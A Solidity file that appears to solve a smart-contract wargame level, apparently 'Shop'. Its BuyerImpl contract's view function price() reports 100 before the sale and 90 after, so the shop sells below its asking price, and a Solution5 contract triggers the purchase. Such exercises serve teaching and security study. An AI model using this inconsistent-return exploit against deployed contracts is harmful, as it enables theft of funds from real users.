// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./Shop.sol";

// view functions ( price() ) are restricted to change contract values, but still can change return value
// basing on values from other contracts

contract BuyerImpl is Buyer {
    Shop public shop;

    constructor(Shop shop_) {
        shop = shop_;
    }

    function buy() external {
        shop.buy();
    }

    function price() external view returns (uint) {
        if (!shop.isSold()) {
            return 100;
        }
        return 90;
    }
}

contract Solution5 {
    BuyerImpl public victim;

    constructor(BuyerImpl victim_) {
        victim = victim_;
    }

    function attack() external payable {
        victim.buy();
    }
}
